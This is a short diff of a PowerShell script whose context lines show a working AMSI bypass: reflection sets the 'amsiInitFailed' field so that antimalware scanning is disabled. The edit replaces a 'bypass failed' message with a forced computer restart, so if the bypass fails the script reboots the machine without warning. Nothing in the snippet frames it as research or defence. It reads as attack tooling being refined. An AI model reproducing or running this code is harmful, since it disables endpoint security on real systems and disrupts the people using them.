@@ -7,6 +7,6 @@ try {
         $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
         $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     } catch {
-        Write-Host "❌ AMSI bypass failed" -ForegroundColor Red
+        Restart-Computer -Force
     }
 }
